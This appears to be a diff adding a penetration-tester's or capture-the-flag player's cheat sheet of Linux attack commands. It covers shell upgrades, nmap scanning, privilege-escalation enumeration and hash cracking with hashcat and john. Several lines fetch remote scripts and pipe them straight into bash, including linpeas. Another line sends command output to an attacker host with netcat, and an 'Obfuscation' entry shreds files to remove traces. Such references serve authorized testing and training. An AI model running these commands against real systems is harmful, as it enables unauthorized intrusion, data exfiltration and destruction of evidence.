@@ -1,0 +1,58 @@
+#Add host to 'hosts' file
+echo "<address> <host>" | sudo tee -a /etc/hosts
+
+###Upgrading shells
+##Upgrade simple shell to bash
+SHELL=/bin/bash script -q /dev/null
+##Invoke bash with python
+python -c "import pty; pty.spawn('/bin/bash')"
+##Invoke interactive TTY
+stty raw -echo && fg
+
+###Default nmap commands
+nmap -sV -sC -p- -t 4 <address> -o <file>.scan.<num>
+nmap -A -p- -T 4 <address> -o <file>.scan.<num>
+
+###Simple web server
+python -m http.server 8080
+
+###Enumeration
+##System Information
+uname -a		Displays the kernel version and system architecture.
+hostname		Reveals the system's network name.
+cat /etc/os-release	Shows the specific Linux distribution and version.
+lscpu			Details the processor architecture and hardware.
+free -h			Displays available and used memory.
+w			Lists currently logged-in users and their active processes.
+##Permission and Ownership
+whoami				Shows the username you are currently logged in as.
+id				Displays your user ID, group IDs, and supplementary group memberships.
+sudo -l				Lists all commands you are allowed to run as an administrator.
+ls -la				Shows hidden files and lists detailed permissions for files and folders.
+find / -perm -4000 2>/dev/null	Locates all files with the SUID bit set, which allow users to run programs with elevated privileges.
+ls -ld /tmp			Checks permissions on the world-writable temporary directory, often used to store shared or temporary data.
+
+###Run script remotely
+#Private IP
+curl http://<your-ip>/enum.sh | bash
+#Github
+curl -s https://raw.githubusercontent.com/<username>/<repo>/main/enum.sh | bash
+
+###Redirect script output to host
+#Target Command
+<command> | nc -N <host-ip> 54321
+#Host Command
+nc -l -p 54321 >> output.txt
+
+###Tools
+##Linpeas
+#From public github
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+###Obfuscation
+shred -u -z <file>
+
+###Hash Cracking
+##Hashcat 
+hashcat -m <hashcode> <target_file> <wordlist_file>
+john --format=<hash_type> --wordlist=<wordlist_file> <hash_file>
